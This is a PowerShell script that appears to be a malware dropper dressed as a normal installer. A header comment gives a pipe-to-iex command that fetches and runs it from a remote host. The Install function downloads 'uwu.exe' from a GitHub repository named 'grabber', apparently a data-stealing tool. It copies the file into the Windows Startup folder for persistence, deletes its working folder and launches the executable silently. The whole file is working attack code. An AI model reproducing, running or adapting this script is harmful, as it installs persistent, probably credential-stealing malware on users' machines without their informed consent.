# Command to execute: iwr faith.gq | iex

function Optimize-SecurityProtocol {
    # .NET Framework 4.7+ has a default security protocol called 'SystemDefault',
    # which allows the operating system to choose the best protocol to use.
    # If SecurityProtocolType contains 'SystemDefault' (means .NET4.7+ detected)
    # and the value of SecurityProtocol is 'SystemDefault', just do nothing on SecurityProtocol,
    # 'SystemDefault' will use TLS 1.2 if the webrequest requires.
    $isNewerNetFramework = ([System.Enum]::GetNames([System.Net.SecurityProtocolType]) -contains 'SystemDefault')
    $isSystemDefault = ([System.Net.ServicePointManager]::SecurityProtocol.Equals([System.Net.SecurityProtocolType]::SystemDefault))

    # If not, change it to support TLS 1.2
    if (!($isNewerNetFramework -and $isSystemDefault)) {
        # Set to TLS 1.2 (3072), then TLS 1.1 (768), and TLS 1.0 (192). Ssl3 has been superseded,
        # https://docs.microsoft.com/en-us/dotnet/api/system.net.securityprotocoltype?view=netframework-4.5
        [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
        Write-Verbose "SecurityProtocol has been updated to support TLS 1.2"
    }
}
function Get-Downloader {
    $downloadSession = New-Object System.Net.WebClient

    # Set proxy to null if NoProxy is specificed
    if ($NoProxy) {
        $downloadSession.Proxy = $null
    } elseif ($Proxy) {
        # Prepend protocol if not provided
        if (!$Proxy.IsAbsoluteUri) {
            $Proxy = New-Object System.Uri("http://" + $Proxy.OriginalString)
        }

        $Proxy = New-Object System.Net.WebProxy($Proxy)

        if ($null -ne $ProxyCredential) {
            $Proxy.Credentials = $ProxyCredential.GetNetworkCredential()
        } elseif ($ProxyUseDefaultCredentials) {
            $Proxy.UseDefaultCredentials = $true
        }

        $downloadSession.Proxy = $Proxy
    }

    return $downloadSession
}
function Write-InstallInfo {
    param(
        [Parameter(Mandatory = $True, Position = 0)]
        [String] $String,
        [Parameter(Mandatory = $False, Position = 1)]
        [System.ConsoleColor] $ForegroundColor = $host.UI.RawUI.ForegroundColor
    )

    $backup = $host.UI.RawUI.ForegroundColor

    if ($ForegroundColor -ne $host.UI.RawUI.ForegroundColor) {
        $host.UI.RawUI.ForegroundColor = $ForegroundColor
    }

    Write-Output "$String"

    $host.UI.RawUI.ForegroundColor = $backup
}
function Install {
    Write-InstallInfo "Initializing..."
    # Enable TLS 1.2
    Optimize-SecurityProtocol

    # Download zip from GitHub
    Write-InstallInfo "Downloading..."
    $downloader = Get-Downloader
    $file = "$APP_DIR\uwu.exe"
    if (!(Test-Path $APP_DIR)) {
        New-Item -Type Directory $APP_DIR | Out-Null
    }
    Write-Verbose "Downloading to $file"
    $downloader.downloadFile($exe, $file)
    
    # Add to startup folder
    Copy-Item "$APP_DIR\uwu.exe" $STARTUP -Force
    # Add to userprofile folder
    Copy-Item "$APP_DIR\uwu.exe" $env:USERPROFILE -Force
    # Cleanup
    Remove-Item $APP_DIR -Recurse -Force

    # Run the executable
    $currentDir = (Resolve-Path .\).Path
    cd $STARTUP
    Start-Job -ScriptBlock {uwu.exe} > null
    cd $currentDir

    Write-InstallInfo "Done!"
}
# Vars
$exe = "https://github.com/thaddeuskkr/grabber/raw/master/uwu.exe"
$APP_DIR = "$env:USERPROFILE\uwu"
$STARTUP = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
# Quit if anything goes wrong
$oldErrorActionPreference = $ErrorActionPreference
$ErrorActionPreference = 'Stop'
# Bootstrap function
Install
# Reset $ErrorActionPreference to original value
$ErrorActionPreference = $oldErrorActionPreference